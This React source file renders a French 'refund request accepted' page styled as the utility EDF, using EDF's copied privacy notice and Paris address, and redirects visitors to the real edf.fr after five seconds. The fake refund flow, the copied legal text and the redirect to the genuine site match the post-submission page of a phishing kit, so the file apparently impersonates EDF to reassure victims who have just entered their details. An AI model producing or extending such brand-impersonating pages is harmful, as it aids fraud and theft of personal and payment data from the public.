import React from 'react';
import './css/style.css';

function Succes() {
 



  return (
    <div className="Succes">
      <div>
        <div id="title">
          <img style={{marginTop: '10px'}} src="logo.png" />
          <h1 style={{fontSize: '30px', color: 'rgb(226, 58, 5)', float: 'right', marginRight: '10px'}}> Remboursement </h1>
        </div>
        <div id="corps1">
          <div id="title2">
            <h2 style={{color: 'rgb(50, 50, 50)', paddingLeft: '20px', fontSize: '20px'}}>Formulaire de remboursement ! </h2>
          </div>
          <br />
          <div className="container2">
            <h1 style={{fontSize: '20px', color: 'rgb(226, 58, 5)'}}> Votre demande de remboursement a bien été prise en charge </h1>
            <img style={{paddingLeft: 200}} src="valid.png" />
          </div>
        </div>
        <meta httpEquiv="Refresh" content="5;url=https://www.edf.fr/" /> 	
        <div className="container">
          &nbsp;
          <p style={{marginTop: '-40px'}}> Votre adresse e-mail sera exclusivement utilisée dans le cadre de votre espace Client. Elle ne sera jamais vendue à un tiers. 
            Les informations collectées sont destinées à EDF. Elles seront utilisées dans le cadre de la création de votre espace Client et le cas échéant à des fins de prospection commerciale. Conformément à la loi informatique et libertés modifiée, vous disposez sur les informations vous concernant d’un droit d’accès et de rectification ainsi que d’un droit d’opposition, sans frais, à l’utilisation de ces informations à des fins de prospection commerciale.
            Vous pouvez exercer vos droits sous réserve de justifier de votre identité en vous adressant par courrier à EDF - Direction de la Communication - Département Multimédia, 22 - 30 Avenue de Wagram - 75008 Paris. </p>
          <table width={750} align="center">
            <tbody>
              <tr>
                <td>
                  <img src="sec.png" /> 
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default Succes;